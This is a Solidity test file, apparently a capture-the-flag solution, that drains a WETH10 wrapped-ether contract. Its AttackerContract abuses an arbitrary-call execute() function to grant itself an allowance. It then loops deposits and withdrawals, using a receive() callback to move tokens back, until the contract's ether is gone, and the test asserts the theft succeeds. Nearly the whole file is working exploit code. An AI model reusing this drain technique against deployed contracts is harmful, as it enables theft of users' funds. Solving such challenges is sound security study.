// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "@forge-std/Test.sol";
import {WETH10} from "../src/weth10.sol";

// contract AttackerContract {
//     WETH10 weth10;
//     address attacker;
//     uint256 totalBalance;
//     constructor(address _attacker , WETH10 _weth10){
//         attacker = _attacker;
//         weth10 = _weth10;
//     }

//     function takeFalashLoan() public {
//         bytes memory data = abi.encodeWithSignature("approve(address,uint256)" ,[uint256(uint160(bob)), 9999 ether]);
//         totalBalance = address(this).balance;
//         weth10.execute(address(this) , 10 ether , data);
//     }

//     receive() external payable {
//         console.log("amount received : " , address(this).balance);
//     }

// }

contract AttackerContract {
    WETH10 immutable weth10;
    address immutable target;
    address immutable bob;

    bool ispwing;

    constructor(address targetAddress) {
        weth10 = WETH10(payable(targetAddress));
        bob = address(this);
        target = targetAddress;
    }

    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a < b) {
            return a;
        }
        return b;
    }
    

    function pwn() external payable{
        weth10.execute(
            target,
            0,
            abi.encodeWithSignature(
                "approve(address,uint256)",
                [uint256(uint160(bob)), 9999 ether]
            )
        );
        while (target.balance != 0) {
            uint256 amount = min(bob.balance, target.balance);

            // deposit WETH
            weth10.deposit{value: amount}();

            // withdraw WETH, will enter `receive`
            ispwing = true;
            weth10.withdrawAll();
            ispwing = false;

            // transferFrom back your WETH10
            weth10.transferFrom(target, bob, amount);

            // withdraw for real to get extra ETH for your WETH10
            weth10.withdrawAll();
        }
    }

    receive() external payable {
        if(ispwing){
            weth10.transfer(target, msg.value);
        }
    }
}
contract Weth10Test is Test {
    WETH10 public weth;
    address owner;
    address bob;

    function setUp() public {
        weth = new WETH10();
        bob = makeAddr("bob"); // yahi mei hun

        vm.deal(address(weth), 10 ether);
        vm.deal(address(bob), 1 ether);
    }

    function testHack() public {
        assertEq(
            address(weth).balance,
            10 ether,
            "weth contract should have 10 ether"
        );
        
        AttackerContract attackerContract = new AttackerContract(address(weth));
        attackerContract.pwn();

        assertEq(address(weth).balance, 0, "empty weth contract");
        assertEq(address(attackerContract).balance, 11 ether, "player should end with 11 ether");
    }
}
